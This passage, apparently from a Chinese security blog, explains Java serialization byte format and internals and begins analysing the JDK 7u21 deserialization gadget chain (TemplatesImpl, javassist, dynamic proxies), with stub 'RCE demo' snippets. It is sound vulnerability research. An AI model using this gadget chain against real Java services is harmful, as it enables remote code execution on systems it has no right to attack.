<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SerializationDemo</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Serializable</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">private</span> String stringField;</span><br><span class="line">    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> intField;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">SerializationDemo</span><span class="hljs-params">(String s, <span class="hljs-keyword">int</span> i)</span> </span>{</span><br><span class="line">        <span class="hljs-keyword">this</span>.stringField = s;</span><br><span class="line">        <span class="hljs-keyword">this</span>.intField = i;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException </span>{</span><br><span class="line">        ObjectOutputStream oops = <span class="hljs-keyword">new</span> ObjectOutputStream(<span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;./serializable.ser&quot;</span>));</span><br><span class="line">        oops.writeObject(<span class="hljs-keyword">new</span> SerializationDemo(<span class="hljs-string">&quot;Min&quot;</span>, <span class="hljs-keyword">new</span> Random().nextInt(<span class="hljs-number">20</span>)));</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>SerializationDumper    </p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><span class="line">STREAM_MAGIC - 0xac ed</span><br><span class="line">STREAM_VERSION - 0x00 05</span><br><span class="line">Contents</span><br><span class="line">  TC_OBJECT - 0x73</span><br><span class="line">    TC_CLASSDESC - 0x72</span><br><span class="line">      className</span><br><span class="line">        Length - 51 - 0x00 33</span><br><span class="line">        Value - com.p2hm1n.deserialization.basics.SerializationDemo - 0x636f6d2e7032686d316e2e646573657269616c697a6174696f6e2e6261736963732e53657269616c697a6174696f6e44656d6f</span><br><span class="line">      serialVersionUID - 0xf1 6f 46 2a 38 38 6b 46</span><br><span class="line">      newHandle 0x00 7e 00 00</span><br><span class="line">      classDescFlags - 0x02 - SC_SERIALIZABLE</span><br><span class="line">      fieldCount - 2 - 0x00 02</span><br><span class="line">      Fields</span><br><span class="line">        0:</span><br><span class="line">          Int - I - 0x49</span><br><span class="line">          fieldName</span><br><span class="line">            Length - 8 - 0x00 08</span><br><span class="line">            Value - intField - 0x696e744669656c64</span><br><span class="line">        1:</span><br><span class="line">          Object - L - 0x4c</span><br><span class="line">          fieldName</span><br><span class="line">            Length - 11 - 0x00 0b</span><br><span class="line">            Value - stringField - 0x737472696e674669656c64</span><br><span class="line">          className1</span><br><span class="line">            TC_STRING - 0x74</span><br><span class="line">              newHandle 0x00 7e 00 01</span><br><span class="line">              Length - 18 - 0x00 12</span><br><span class="line">              Value - Ljava/lang/String; - 0x4c6a6176612f6c616e672f537472696e673b</span><br><span class="line">      classAnnotations</span><br><span class="line">        TC_ENDBLOCKDATA - 0x78</span><br><span class="line">      superClassDesc</span><br><span class="line">        TC_NULL - 0x70</span><br><span class="line">    newHandle 0x00 7e 00 02</span><br><span class="line">    classdata</span><br><span class="line">      com.p2hm1n.deserialization.basics.SerializationDemo</span><br><span class="line">        values</span><br><span class="line">          intField</span><br><span class="line">            (int)10 - 0x00 00 00 0a</span><br><span class="line">          stringField</span><br><span class="line">            (object)</span><br><span class="line">              TC_STRING - 0x74</span><br><span class="line">                newHandle 0x00 7e 00 03</span><br><span class="line">                Length - 3 - 0x00 03</span><br><span class="line">                Value - Min - 0x4d696e</span><br></pre></td></tr></tbody></table></figure><p></p>
<ul>
<li><code>0xaced</code>&#xFF0C;&#x9B54;&#x672F;&#x5934;</li>
<li><code>0x0005</code>&#xFF0C;&#x7248;&#x672C;&#x53F7; <em>&#xFF08;JDK&#x4E3B;&#x6D41;&#x7248;&#x672C;&#x4E00;&#x81F4;&#xFF0C;&#x4E0B;&#x6587;&#x5982;&#x65E0;&#x7279;&#x6B8A;&#x6807;&#x6CE8;&#xFF0C;&#x90FD;&#x4EE5;JDK8u&#x4E3A;&#x4F8B;&#xFF09;</em></li>
<li><code>0x73</code>&#xFF0C;&#x5BF9;&#x8C61;&#x7C7B;&#x578B;&#x6807;&#x8BC6; <em>&#xFF08;<code>0x7n</code>&#x57FA;&#x672C;&#x4E0A;&#x90FD;&#x5B9A;&#x4E49;&#x4E86;&#x7C7B;&#x578B;&#x6807;&#x8BC6;&#x7B26;&#x5E38;&#x91CF;&#xFF0C;&#x4F46;&#x4E5F;&#x8981;&#x770B;&#x51FA;&#x73B0;&#x7684;&#x4F4D;&#x7F6E;&#xFF0C;&#x6BD5;&#x7ADF;&#x5B83;&#x4EEC;&#x90FD;&#x5728;&#x53EF;&#x89C1;&#x5B57;&#x7B26;&#x7684;&#x8303;&#x56F4;&#xFF0C;&#x8BE6;&#x89C1;<code>java.io.ObjectStreamConstants</code>&#xFF09;</em></li>
<li><code>0x72</code>&#xFF0C;&#x7C7B;&#x63CF;&#x8FF0;&#x7B26;&#x6807;&#x8BC6;</li>
<li><code>0x0033...</code>&#xFF0C;&#x7C7B;&#x540D;&#x5B57;&#x7B26;&#x4E32;&#x957F;&#x5EA6;&#x548C;&#x503C; <em>&#xFF08;Java&#x5E8F;&#x5217;&#x5316;&#x4E2D;&#x7684;UTF8&#x683C;&#x5F0F;&#x6807;&#x51C6;&#xFF09;</em></li>
<li><code>0xf16f462a38386b46</code>&#xFF0C;&#x5E8F;&#x5217;&#x7248;&#x672C;&#x552F;&#x4E00;&#x6807;&#x8BC6; <em>&#xFF08;<code>serialVersionUID</code>&#xFF0C;&#x7B80;&#x79F0;SUID&#xFF09;</em></li>
<li><code>0x02</code>&#xFF0C;&#x5BF9;&#x8C61;&#x7684;&#x5E8F;&#x5217;&#x5316;&#x5C5E;&#x6027;&#x6807;&#x5FD7;&#x4F4D;&#xFF0C;&#x5982;&#x662F;&#x5426;&#x662F;Block Data&#x6A21;&#x5F0F;&#x3001;&#x81EA;&#x5B9A;&#x4E49;<code>writeObject()</code>&#xFF0C;<code>Serializable</code>&#x3001;<code>Externalizable</code>&#x6216;<code>Enum</code>&#x7C7B;&#x578B;&#x7B49;</li>
<li><code>0x0002</code>&#xFF0C;&#x7C7B;&#x7684;&#x5B57;&#x6BB5;&#x4E2A;&#x6570;</li>
<li><code>0x49</code>&#xFF0C;&#x6574;&#x6570;&#x7C7B;&#x578B;&#x7B7E;&#x540D;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x5B57;&#x8282;&#xFF0C;&#x540C;&#x7406;&#xFF0C;&#x4E4B;&#x540E;&#x7684;<code>0x4c</code>&#x4E3A;&#x5B57;&#x7B26;&#x4E32;&#x7C7B;&#x578B;&#x7B7E;&#x540D;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x5B57;&#x8282; <em>&#xFF08;&#x7C7B;&#x578B;&#x7B7E;&#x540D;&#x8868;&#x793A;&#x4E0E;JVM&#x89C4;&#x8303;&#x4E2D;&#x7684;&#x5B9A;&#x4E49;&#x76F8;&#x540C;&#xFF09;</em></li>
<li><code>0x0008...</code>&#xFF0C;&#x5B57;&#x6BB5;&#x540D;&#x5B57;&#x7B26;&#x4E32;&#x957F;&#x5EA6;&#x548C;&#x503C;&#xFF0C;&#x975E;&#x539F;&#x59CB;&#x6570;&#x636E;&#x7C7B;&#x578B;&#x7684;&#x5B57;&#x6BB5;&#x8FD8;&#x4F1A;&#x5728;&#x540E;&#x9762;&#x52A0;&#x4E0A;&#x6570;&#x636E;&#x7C7B;&#x578B;&#x6807;&#x8BC6;&#x3001;&#x5B8C;&#x6574;&#x7C7B;&#x578B;&#x7B7E;&#x540D;&#x957F;&#x5EA6;&#x548C;&#x503C;</li>
<li><code>0x78</code> Block Data&#x7ED3;&#x675F;&#x6807;&#x8BC6;</li>
<li><code>0x70</code> &#x7236;&#x7C7B;&#x63CF;&#x8FF0;&#x7B26;&#x6807;&#x8BC6;&#xFF0C;&#x6B64;&#x5904;&#x4E3A;<code>null</code></li>
<li><code>0x0000000a</code> &#x6574;&#x6570;&#x5B57;&#x6BB5;<code>intField</code>&#x7684;&#x503C; <em>&#xFF08;Java&#x5E8F;&#x5217;&#x5316;&#x4E2D;&#x7684;&#x6574;&#x6570;&#x683C;&#x5F0F;&#x6807;&#x51C6;&#xFF09;</em> &#xFF0C;&#x975E;&#x539F;&#x59CB;&#x6570;&#x636E;&#x7C7B;&#x578B;&#x7684;&#x5B57;&#x6BB5;&#x5219;&#x4F1A;&#x6309;&#x5BF9;&#x8C61;&#x7684;&#x65B9;&#x5F0F;&#x5904;&#x7406;&#xFF0C;&#x5982;&#x4E4B;&#x540E;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x5B57;&#x6BB5;<code>stringField</code>&#x88AB;&#x8BC6;&#x522B;&#x4E3A;&#x5B57;&#x7B26;&#x4E32;&#x7C7B;&#x578B;&#xFF0C;&#x8F93;&#x51FA;&#x5B57;&#x7B26;&#x4E32;&#x7C7B;&#x578B;&#x6807;&#x8BC6;&#x3001;&#x5B57;&#x7B26;&#x4E32;&#x957F;&#x5EA6;&#x548C;&#x503C;</li>
</ul>
<p><strong>&#x5E8F;&#x5217;&#x5316;&#x7684;&#x6267;&#x884C;&#x6D41;&#x7A0B;</strong></p>
<ol>
<li><code>ObjectOutputStream</code>&#x5B9E;&#x4F8B;&#x521D;&#x59CB;&#x5316;&#x65F6;&#xFF0C;&#x5C06;&#x9B54;&#x672F;&#x5934;&#x548C;&#x7248;&#x672C;&#x53F7;&#x5199;&#x5165;<code>bout</code> <em>&#xFF08;<code>BlockDataOutputStream</code>&#x7C7B;&#x578B;&#xFF09;</em> &#x4E2D;</li>
<li>&#x8C03;&#x7528; <code>ObjectOutputStream.writeObject()</code>&#x5F00;&#x59CB;&#x5199;&#x5BF9;&#x8C61;&#x6570;&#x636E;<ul>
<li><code>ObjectStreamClass.lookup()</code>&#x5C01;&#x88C5;&#x5F85;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x7C7B;&#x63CF;&#x8FF0; <em>&#xFF08;&#x8FD4;&#x56DE;<code>ObjectStreamClass</code>&#x7C7B;&#x578B;&#xFF09;</em> &#xFF0C;&#x83B7;&#x53D6;&#x5305;&#x62EC;&#x7C7B;&#x540D;&#x3001;&#x81EA;&#x5B9A;&#x4E49;<code>serialVersionUID</code>&#x3001;&#x53EF;&#x5E8F;&#x5217;&#x5316;&#x5B57;&#x6BB5; <em>&#xFF08;&#x8FD4;&#x56DE;<code>ObjectStreamField</code>&#x7C7B;&#x578B;&#xFF09;</em> &#x548C;&#x6784;&#x9020;&#x65B9;&#x6CD5;&#xFF0C;&#x4EE5;&#x53CA;<code>writeObject</code>&#x3001;<code>readObject</code>&#x65B9;&#x6CD5;&#x7B49;</li>
<li><code>writeOrdinaryObject()</code>&#x5199;&#x5165;&#x5BF9;&#x8C61;&#x6570;&#x636E;<ul>
<li>&#x5199;&#x5165;&#x5BF9;&#x8C61;&#x7C7B;&#x578B;&#x6807;&#x8BC6;</li>
<li><code>writeClassDesc()</code>&#x8FDB;&#x5165;&#x5206;&#x652F;<code>writeNonProxyDesc()</code>&#x5199;&#x5165;&#x7C7B;&#x63CF;&#x8FF0;&#x6570;&#x636E;<ul>
<li>&#x5199;&#x5165;&#x7C7B;&#x63CF;&#x8FF0;&#x7B26;&#x6807;&#x8BC6;</li>
<li>&#x5199;&#x5165;&#x7C7B;&#x540D;</li>
<li>&#x5199;&#x5165;SUID <em>&#xFF08;&#x5F53;SUID&#x4E3A;&#x7A7A;&#x65F6;&#xFF0C;&#x4F1A;&#x8FDB;&#x884C;&#x8BA1;&#x7B97;&#x5E76;&#x8D4B;&#x503C;&#xFF0C;&#x7EC6;&#x8282;&#x89C1;&#x4E0B;&#x9762;&#x5173;&#x4E8E;SerialVersionUID&#x7AE0;&#x8282;&#xFF09;</em></li>
<li>&#x8BA1;&#x7B97;&#x5E76;&#x5199;&#x5165;&#x5E8F;&#x5217;&#x5316;&#x5C5E;&#x6027;&#x6807;&#x5FD7;&#x4F4D;</li>
<li>&#x5199;&#x5165;&#x5B57;&#x6BB5;&#x4FE1;&#x606F;&#x6570;&#x636E;</li>
<li>&#x5199;&#x5165;Block Data&#x7ED3;&#x675F;&#x6807;&#x8BC6;</li>
<li>&#x5199;&#x5165;&#x7236;&#x7C7B;&#x63CF;&#x8FF0;&#x6570;&#x636E;</li>
</ul>
</li>
<li><code>writeSerialData()</code>&#x5199;&#x5165;&#x5BF9;&#x8C61;&#x7684;&#x5E8F;&#x5217;&#x5316;&#x6570;&#x636E;<ul>
<li>&#x82E5;&#x7C7B;&#x81EA;&#x5B9A;&#x4E49;&#x4E86;<code>writeObject()</code>&#xFF0C;&#x5219;&#x8C03;&#x7528;&#x8BE5;&#x65B9;&#x6CD5;&#x5199;&#x5BF9;&#x8C61;&#xFF0C;&#x5426;&#x5219;&#x8C03;&#x7528;<code>defaultWriteFields()</code>&#x5199;&#x5165;&#x5BF9;&#x8C61;&#x7684;&#x5B57;&#x6BB5;&#x6570;&#x636E; <em>&#xFF08;&#x82E5;&#x662F;&#x975E;&#x539F;&#x59CB;&#x7C7B;&#x578B;&#xFF0C;&#x5219;&#x9012;&#x5F52;&#x5904;&#x7406;&#x5B50;&#x5BF9;&#x8C61;&#xFF09;</em></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ol>
<p><strong>&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x6267;&#x884C;&#x6D41;&#x7A0B;</strong></p>
<ol>
<li><code>ObjectInputStream</code>&#x5B9E;&#x4F8B;&#x521D;&#x59CB;&#x5316;&#x65F6;&#xFF0C;&#x8BFB;&#x53D6;&#x9B54;&#x672F;&#x5934;&#x548C;&#x7248;&#x672C;&#x53F7;&#x8FDB;&#x884C;&#x6821;&#x9A8C;</li>
<li>&#x8C03;&#x7528;<code>ObjectInputStream.readObject()</code>&#x5F00;&#x59CB;&#x8BFB;&#x5BF9;&#x8C61;&#x6570;&#x636E;<ul>
<li>&#x8BFB;&#x53D6;&#x5BF9;&#x8C61;&#x7C7B;&#x578B;&#x6807;&#x8BC6;</li>
<li><code>readOrdinaryObject()</code>&#x8BFB;&#x53D6;&#x6570;&#x636E;&#x5BF9;&#x8C61;<ul>
<li><code>readClassDesc()</code>&#x8BFB;&#x53D6;&#x7C7B;&#x63CF;&#x8FF0;&#x6570;&#x636E;<ul>
<li>&#x8BFB;&#x53D6;&#x7C7B;&#x63CF;&#x8FF0;&#x7B26;&#x6807;&#x8BC6;&#xFF0C;&#x8FDB;&#x5165;&#x5206;&#x652F;<code>readNonProxyDesc()</code></li>
<li>&#x8BFB;&#x53D6;&#x7C7B;&#x540D;</li>
<li>&#x8BFB;&#x53D6;SUID</li>
<li>&#x8BFB;&#x53D6;&#x5E76;&#x5206;&#x89E3;&#x5E8F;&#x5217;&#x5316;&#x5C5E;&#x6027;&#x6807;&#x5FD7;&#x4F4D;</li>
<li>&#x8BFB;&#x53D6;&#x5B57;&#x6BB5;&#x4FE1;&#x606F;&#x6570;&#x636E;</li>
<li><code>resolveClass()</code>&#x6839;&#x636E;&#x7C7B;&#x540D;&#x83B7;&#x53D6;&#x5F85;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x7C7B;&#x7684;<code>Class</code>&#x5BF9;&#x8C61;&#xFF0C;&#x5982;&#x679C;&#x83B7;&#x53D6;&#x5931;&gt; &#x8D25;&#xFF0C;&#x5219;&#x629B;&#x51FA;<code>ClassNotFoundException</code></li>
<li><code>skipCustomData()</code>&#x5FAA;&#x73AF;&#x8BFB;&#x53D6;&#x5B57;&#x8282;&#x76F4;&#x5230;Block Data&#x7ED3;&#x675F;&#x6807;&#x8BC6;&#x4E3A;&#x6B62;</li>
<li>&#x8BFB;&#x53D6;&#x7236;&#x7C7B;&#x63CF;&#x8FF0;&#x6570;&#x636E;</li>
<li><code>initNonProxy()</code>&#x4E2D;&#x5224;&#x65AD;&#x5BF9;&#x8C61;&#x4E0E;&#x672C;&#x5730;&#x5BF9;&#x8C61;&#x7684;SUID&#x548C;&#x7C7B;&#x540D; <em>&#xFF08;&#x4E0D;&#x542B;&#x5305;&#x540D;&#xFF09;</em> &#x662F;&#x5426;&#x76F8;&#x540C;&#xFF0C;&#x82E5;&#x4E0D;&#x540C;&#xFF0C;&#x5219;&#x629B;&#x51FA;<code>InvalidClassException</code></li>
</ul>
</li>
<li><code>ObjectStreamClass.newInstance()</code>&#x83B7;&#x53D6;&#x5E76;&#x8C03;&#x7528;&#x79BB;&#x5BF9;&#x8C61;&#x6700;&#x8FD1;&#x7684;&#x975E;<code>Serializable</code>&#x7684;&#x7236;&#x7C7B;&#x7684;&#x65E0;&#x53C2;&#x6784;&#x9020;&#x65B9;&#x6CD5; <em>&#xFF08;&#x82E5;&#x4E0D;&#x5B58;&#x5728;&#xFF0C;&#x5219;&#x8FD4;&#x56DE;<code>null</code>&#xFF09;</em> &#x521B;&#x5EFA;&#x5BF9;&#x8C61;&#x5B9E;&#x4F8B;</li>
<li><code>readSerialData()</code>&#x8BFB;&#x53D6;&#x5BF9;&#x8C61;&#x7684;&#x5E8F;&#x5217;&#x5316;&#x6570;&#x636E;<ul>
<li>&#x82E5;&#x7C7B;&#x81EA;&#x5B9A;&#x4E49;&#x4E86;<code>readObject()</code>&#xFF0C;&#x5219;&#x8C03;&#x7528;&#x8BE5;&#x65B9;&#x6CD5;&#x8BFB;&#x5BF9;&#x8C61;&#xFF0C;&#x5426;&#x5219;&#x8C03;&#x7528;<code>defaultReadFields()</code>&#x8BFB;&#x53D6;&#x5E76;&#x586B;&#x5145;&#x5BF9;&#x8C61;&#x7684;&#x5B57;&#x6BB5;&#x6570;&#x636E;</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ol>
<p>&#x8865;&#x5145;&#x4E00;&#x4E2A;&#x7EC6;&#x8282;&#x662F;&#x5728;&#x8FDB;&#x884C;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#x8FD9;&#x91CC;&#x8FDB;&#x884C;&#x4E86;&#x5224;&#x65AD;</p>
<p><img src="/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210214150708996.png" alt></p>
<p>&#x5982;&#x679C;&#x6EE1;&#x8DB3; <code>hasReadObjectMethod</code> &#x7684;&#x6761;&#x4EF6;&#xFF0C;&#x4F1A;&#x8C03;&#x7528; <code>invokeReadObject</code></p>
<p><img src="/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210214151252315.png" alt></p>
<p>&#x5F15;&#x7528; @l1nk3r &#x5E08;&#x5085;&#x7684;&#x603B;&#x7ED3;</p>
<blockquote>
<p>&#x662F;&#x5426;&#x91CD;&#x5199;&#x4E86; <strong>readObject</strong> &#x5F71;&#x54CD;&#x7684;&#x662F; <strong>slotDesc.hasReadObjectMethod()</strong> &#x7684;&#x7ED3;&#x679C;</p>
<p>&#x5982;&#x679C;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#x88AB;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x7C7B;&#x91CD;&#x5199;&#x4E86; <strong>readObject</strong> &#xFF0C;&#x8BE5;&#x6570;&#x636E;&#x5728;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#x6838;&#x5FC3;&#x6D41;&#x7A0B;&#x8D70;&#x5230; <strong>readSerialData</strong> &#x65B9;&#x6CD5;&#x4E2D;&#x7684; <strong>slotDesc.invokeReadObject</strong> &#x65B9;&#x6CD5;&#xFF0C;&#x901A;&#x8FC7;&#x53CD;&#x5C04;&#x673A;&#x5236;&#x89E6;&#x53D1;&#x76F8;&#x5173;&#x6D41;&#x7A0B;&#xFF0C;&#x5E76;&#x4E14;&#x8C03;&#x7528;&#x91CD;&#x5199;&#x7684; <strong>readObject</strong> &#x3002;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x91CD;&#x5199; <strong>readObject</strong> &#xFF0C;&#x5219;&#x8C03;&#x7528; <strong>ObjectInputStream</strong> &#x7C7B;&#x4E2D;&#x7684; <strong>readObject</strong> &#x65B9;&#x6CD5;&#xFF0C;&#x5E76;&#x4E14;&#x6267;&#x884C;&#x53CD;&#x5E8F;&#x5217;&#x5316;</p>
</blockquote>
<p>&#x540C;&#x65F6;&#x8865;&#x4E00;&#x5F20;&#x6D41;&#x7A0B;&#x56FE;</p>
<p><img src="/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/u4inn.png" alt></p>
<p>&#x66F4;&#x4E3A;&#x8BE6;&#x7EC6;&#x7684;&#x6D41;&#x7A0B;&#x5206;&#x6790;&#x53EF;&#x4EE5;&#x770B;&#x4EE5;&#x4E0B;&#x6587;&#x7AE0;&#xFF1A;</p>
<p><a href="http://www.lmxspace.com/2019/11/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%87%E7%A8%8B%E6%B7%B1%E7%A9%B6/" target="_blank" rel="noopener">Java&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x8FC7;&#x7A0B;&#x6DF1;&#x7A76;</a></p>
<p><a href="http://redteam.today/2020/02/14/Java%E5%8E%9F%E7%94%9F%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A3%E7%A0%81%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/#%E5%89%8D%E8%A8%80" target="_blank" rel="noopener">Java&#x539F;&#x751F;&#x5E8F;&#x5217;&#x5316;&#x4E0E;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x4EE3;&#x7801;&#x7B80;&#x8981;&#x5206;&#x6790;</a></p>
<p><a href="https://github.com/gyyyy/footprint/blob/master/articles/2019/about-java-serialization-and-deserialization.md" target="_blank" rel="noopener">&#x6D45;&#x6790;Java&#x5E8F;&#x5217;&#x5316;&#x548C;&#x53CD;&#x5E8F;&#x5217;&#x5316;</a></p>
<h1 id="JDK-7u21-Gadget-Chain"><a href="#JDK-7u21-Gadget-Chain" class="headerlink" title="JDK 7u21 Gadget Chain"></a>JDK 7u21 Gadget Chain</h1><h2 id="Basics"><a href="#Basics" class="headerlink" title="Basics"></a>Basics</h2><p>&#x5927;&#x81F4;&#x51E0;&#x70B9;&#x53EF;&#x4EE5;&#x770B;&#x4E00;&#x4E0B; @&#x5929;&#x878D;&#x4FE1;&#x963F;&#x5C14;&#x6CD5;&#x5B9E;&#x9A8C;&#x5BA4; &#x8FD9;&#x4E2A;&#x8111;&#x56FE; </p>
<p><img src="/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/abfd01ca-62cc-4ad9-80e0-c7ce8fee9d51.png-w331s" alt></p>
<p>CC &#x4E2D;&#x6211;&#x4EEC;&#x4E5F;&#x7528;&#x5230;&#x4E86;&#x901A;&#x8FC7; javassist &#x6784;&#x9020;  Static Initializers&#xFF0C;&#x56DE;&#x987E;&#x6211;&#x4EEC;&#x4E4B;&#x524D;&#x6784;&#x9020;&#x8C03;&#x7528; <code>TemplatesImpl#newTransformer</code> &#x7ED3;&#x5408; javassist &#x5B9E;&#x73B0;&#x7684;&#x4E00;&#x4E2A; RCE &#x7684; demo&#xFF0C;&#x5F53;&#x65F6;&#x7684;&#x601D;&#x8DEF;&#x662F;&#x7528; <code>IvokerTransformer#transform</code> &#x53BB;&#x89E6;&#x53D1; <code>TemplatesImpl#newTransformer</code> &#x6765;&#x8FBE;&#x5230; RCE</p>
<p>&#x56DE;&#x770B; <code>TemplatesImpl</code> &#x5176;&#x4ED6;&#x65B9;&#x6CD5;&#xFF0C;&#x5176;&#x5B9E;&#x8C03;&#x7528;&#x4E86;  <code>TemplatesImpl#newTransformer</code>  &#x7684;&#x4E5F;&#x80FD; RCE&#xFF0C;&#x6BD4;&#x5982;&#x6211;&#x4EEC;&#x8FD9;&#x91CC; <code>TemplatesImpl#getOutputProperties</code></p>
<p><img src="/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210214155858889.png" alt></p>
<p>&#x7531;&#x6B64;&#x6211;&#x4EEC;&#x5B9E;&#x73B0;&#x7B2C;&#x4E00;&#x4E2A; RCE demo</p>
<p><strong>Level-0 demo</strong></p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CommandDemo</span> </span>{</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>{</span><br><span class="line">        <span class="hljs-comment">// javassist fake Code</span></span><br><span class="line">        templates.getOutputProperties();</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x53E6;&#x4E00;&#x4E2A;&#x9700;&#x8981;&#x5173;&#x6CE8;&#x7684;&#x70B9;&#x662F; hashCode &#x7684;&#x4E00;&#x4E2A;&#x5C0F; trick&#xFF0C;<code>f5a5a608</code> &#x7684; hashCode &#x503C;&#x4E3A; 0</p>
<p><img src="/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210216155234182.png" alt></p>
<h2 id="Gadget-chain"><a href="#Gadget-chain" class="headerlink" title="Gadget chain"></a>Gadget chain</h2><p>&#x770B;&#x4E00;&#x4E0B; <code>javax.xml.transform.Templates</code> &#xFF0C;&#x91CC;&#x9762;&#x6709;&#x4E24;&#x4E2A;&#x65B9;&#x6CD5;&#x90FD;&#x662F;&#x6211;&#x4EEC;&#x60F3;&#x8C03;&#x7528;&#x7684;&#xFF0C;&#x610F;&#x5473;&#x7740;&#x53EA;&#x8981;&#x80FD;&#x5FAA;&#x73AF;&#x6253;&#x5370;&#x8FD9;&#x4E2A; interface &#x7684;&#x65B9;&#x6CD5;&#xFF0C;&#x5E76;&#x5728;&#x67D0;&#x4E2A;&#x7C7B;&#x8C03;&#x7528;&#x8FD9;&#x4E2A;&#x65B9;&#x6CD5;&#xFF0C;&#x6211;&#x4EEC;&#x5373;&#x53EF; RCE</p>
<p><img src="/2021/02/14/%E6%B7%B1%E5%85%A5-Java-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210214172424266.png" alt></p>
<p>&#x518D;&#x7ED3;&#x5408;&#x540C;&#x6837;&#x5728; CC &#x4E2D;&#x7528;&#x8FC7;&#x7684; AnnotationInvocationHandler &#x548C;&#x52A8;&#x6001;&#x4EE3;&#x7406;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5B9E;&#x73B0;&#x7B2C;&#x4E8C;&#x4E2A; RCE demo</p>
<p><strong>Level-1 demo</strong></p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CommandDemo</span> </span>{</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>{</span><br><span class="line">      <span class="hljs-comment">// javassist fake Code</span></span><br><span class="line">      <span class="hljs-comment">// proxy fake Code</span></span><br><span class="line">        proxy.equals(templates);</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x4ECE;&#x6B63;&#x5411;&#x601D;&#x7EF4;&#x6765;&#x770B;&#xFF0C;&#x5148;&#x8C08;&#x4E00;&#x4E0B;&#x4E3A;&#x4EC0;&#x4E48;&#x8981;&#x7528; <code>equals</code> &#x6765;&#x89E6;&#x53D1; </p>
